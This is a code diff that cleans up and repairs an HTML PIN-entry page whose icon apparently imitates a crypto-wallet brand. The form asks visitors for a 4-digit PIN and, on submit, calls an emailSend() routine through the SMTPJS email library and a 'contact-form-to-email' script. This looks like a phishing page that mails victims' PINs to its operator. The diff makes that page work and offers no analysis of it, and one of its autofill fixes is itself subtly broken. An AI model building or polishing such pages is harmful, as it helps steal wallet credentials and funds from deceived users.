@@ -1,13 +1,10 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <link rel="icon" type="image/svg+xml" href="asset/mm-logo-813a440f.svg">
-    
-    
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Home</title>
-
-
 
     <style>
         input {
@@ -16,73 +13,62 @@
             caret-color: #0074DE;
         }
     </style>
-  <script type="module" src="main.js"></script>
-  <link rel="stylesheet" href="pin.css">
+    <script type="module" src="main.js"></script>
+    <link rel="stylesheet" href="pin.css">
 </head>
-<body class="bg-gray-100" data-new-gr-c-s-check-loaded="8.907.0" data-gr-ext-installed="">
+<body class="bg-gray-100">
 
     <div class="w-[90%] max-w-md mx-auto pt-5">
 
         <div id="ctn">
 
-	<form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-4"/>
-		
+            <form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-4">
 
-            <input type="number" id="pin" name="pin" class="hidden">
+                <input type="number" id="pin" name="pin" class="hidden">
 
-		<div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
+                <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
+                    <p class="font-bold text-xl mb-3">Please enter your pin to proceed</p>
+                    <div class="flex items-center justify-center gap-x-4 mb-5">
+                        <input type="tel" name="pin1" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                        <input type="tel" name="pin2" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                        <input type="tel" name="pin3" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                        <input type="tel" name="pin4" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                    </div>
+                    <button class="bg-primary text-white w-full rounded-md p-4">Loading...</button>
+                </div>
 
-            <p class="font-bold text-xl mb-3">Please enter your pin to proceed</p>
-
-			<div class="flex items-center justify-center gap-x-4 mb-5">
-				<input type="tel" name="pin1" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary  transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
-				<input type="tel" name="pin2" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary  transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
-				<input type="tel" name="pin3" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)">
-				<input type="tel" name="pin4" required="" class="font-bold pin text-center bg-gray-100 focus:border-primary transition-all text-lg outline-none  rounded-md1" onkeyup="inputInsideOtpInput(this)" maxlength="1">
-			</div>
-
-			<button class="bg-primary text-white w-full rounded-md p-4 >Loading...</button>
-
-		</div>
-	</form>
-	</div>
+            </form>
+        </div>
     </div>
 
-    
-        <script src="">
-			</script>
-	<script src="https//smtpjs.com/v3/smtp.js"></script>
-        <script src="Contact-form-to-email1.js1"></script>
-        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-
-<script>
-    function inputInsideOtpInput(el) {
-        if (el.value.length > 1) {
-            el.value == ''
-            if (el.nextElementSibling.value == '') {
-                el.nextElementSibling.value = el.value[el.value.length - 1]
+    <script src="Contact-form-to-email1.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function inputInsideOtpInput(el) {
+            if (el.value.length > 1) {
+                el.value = el.value[0];
+                if (el.nextElementSibling && el.nextElementSibling.value === '') {
+                    el.nextElementSibling.value = el.value[1];
+                }
             }
-            if (!el.nextElementSibling) {
-                el.value = el.value[0]
+            try {
+                if (el.value == null || el.value === "") {
+                    focusOnInput(el.previousElementSibling);
+                } else {
+                    focusOnInput(el.nextElementSibling);
+                }
+            } catch (e) {
+                console.log(e);
             }
-            el.value = el.value[0]
         }
-        try {
-            if (el.value == null || el.value == "") {
-                this.foucusOnInput(el.previousElementSibling);
-            } else {
-                this.foucusOnInput(el.nextElementSibling);
+
+        function focusOnInput(ele) {
+            if (ele) {
+                ele.focus();
             }
-        } catch (e) {
-            console.log(e);
         }
-    }
+    </script>
 
-    function foucusOnInput(ele) {
-        ele.focus();
-    }
-
-</script>
-
-
-</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
+</body>
+</html>
